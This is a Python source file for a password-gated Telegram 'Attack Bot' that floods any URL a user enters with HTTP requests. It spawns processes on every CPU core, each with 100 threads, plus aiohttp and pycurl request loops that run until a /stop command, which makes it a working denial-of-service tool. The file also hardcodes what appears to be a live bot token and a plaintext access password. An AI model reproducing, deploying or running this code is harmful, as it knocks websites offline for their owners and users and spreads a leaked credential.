import telebot
import asyncio
import requests
import aiohttp
import multiprocessing
from concurrent.futures import ThreadPoolExecutor
from io import BytesIO
import pycurl
from colorama import Fore, Style

# توكن البوت
TOKEN = '7823594166:AAG5HvvfOnliCBVKu9VsnzmCgrQb68m91go'
bot = telebot.TeleBot(TOKEN)

# متغير التحكم في الإيقاف
stop_attack_flag = multiprocessing.Value('b', False)

def display_banner(chat_id):
    banner_text = "Welcome to the Attack Bot! Enter the password to continue."
    bot.send_message(chat_id, banner_text)

def check_password(message):
    password = message.text
    if password == "junai":
        bot.send_message(message.chat.id, "Correct password! Opening attack menu...")
        start_attack(message.chat.id)
    else:
        bot.send_message(message.chat.id, "Wrong password! Exiting...")

@bot.message_handler(commands=['start'])
def handle_start(message):
    display_banner(message.chat.id)
    bot.register_next_step_handler_by_chat_id(message.chat.id, check_password)

@bot.message_handler(commands=['stop'])
def handle_stop(message):
    with stop_attack_flag.get_lock():
        stop_attack_flag.value = True
    bot.send_message(message.chat.id, "Attack stopped successfully!")

def send_requests_threaded(target, stop_flag):
    session = requests.Session()
    
    def send_request():
        while not stop_flag.value:
            try:
                session.get(target, timeout=5)
            except requests.exceptions.RequestException:
                pass

    with ThreadPoolExecutor(max_workers=100) as executor:
        futures = [executor.submit(send_request) for _ in range(100)]
        for future in futures:
            if stop_flag.value:
                break

async def send_requests_aiohttp(target, stop_flag):
    async with aiohttp.ClientSession() as session:
        while not stop_flag.value:
            try:
                async with session.get(target, timeout=5):
                    pass
            except aiohttp.ClientError:
                pass

def send_requests_pycurl(target, stop_flag):
    while not stop_flag.value:
        buffer = BytesIO()
        c = pycurl.Curl()
        c.setopt(c.URL, target)
        c.setopt(c.WRITEDATA, buffer)
        try:
            c.perform()
        except pycurl.error:
            pass
        finally:
            c.close()

def start_attack(chat_id):
    msg = bot.send_message(chat_id, "Enter target URL:")
    bot.register_next_step_handler(msg, get_target_details)

def get_target_details(message):
    target = message.text
    bot.send_message(message.chat.id, f"Starting attack on {target}...")
    execute_attack(message.chat.id, target)

def execute_attack(chat_id, target):
    processes = []

    with stop_attack_flag.get_lock():
        stop_attack_flag.value = False

    total_cores = multiprocessing.cpu_count()
    for _ in range(total_cores):
        process = multiprocessing.Process(target=send_requests_threaded, args=(target, stop_attack_flag))
        processes.append(process)
        process.start()

    asyncio.run(send_requests_aiohttp(target, stop_attack_flag))

    pycurl_process = multiprocessing.Process(target=send_requests_pycurl, args=(target, stop_attack_flag))
    processes.append(pycurl_process)
    pycurl_process.start()

    for process in processes:
        process.join()

def main():
    bot.polling(none_stop=True)

if __name__ == "__main__":
    main()
